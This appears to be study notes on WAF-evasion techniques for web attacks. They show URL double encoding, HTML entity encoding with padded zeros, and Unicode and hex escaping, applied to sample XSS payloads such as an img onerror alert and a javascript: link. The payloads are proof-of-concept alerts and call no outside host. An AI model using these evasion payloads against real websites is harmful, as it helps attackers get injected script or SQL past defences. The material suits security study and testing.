## URL encoding

In an URL, special chars (and letters) like # or & is encoded into %AA where AA are two digits. For instance 
SELECT -> `%53%45%4C%45%43%54`. 

If we were to lunch an SQL attack or an XSS, but the website has WAF up (Web Application Firewall), it will identify the payload.  For example:

We want to inject:
			`<img src=x onerror=alert(1)>`

The URL will look like:
	`[...]/?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3`

WAF will block it. But, if we were to double encode, hence changing the % for %25 (its respective encoded value) getting the new URL:
	`[...]/ search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E`
	
Now, unless the website/WAF is also checking for double-encoding, the payload should go through as expected.

## HTML Encoding

Just like it worked with URL, HTML also encodes characters with a specific syntax. We can change letters in the payload with its respective HTML encoded value:

`<img src=x onerror="&#x61;lert(1)">`

### Leading Zeros

If our HTML-encoded payload still gets blocked, we can add zeroes to the encoded value. Some WAFs fail to deal with it:
`<a href="javascript&#00000000000058;alert(1)">Click me</a>`

## Unicode Encoding

Using the prefix `\u` followed by 4-digits is another way to encode chars. For instance:
		`eval("\u0061lert(1)")` 

### Hex Escaping

`\x` to encode with hexadecimal values:

`eval("\x61lert")` or `SELECT -> 0x53454c454354` 


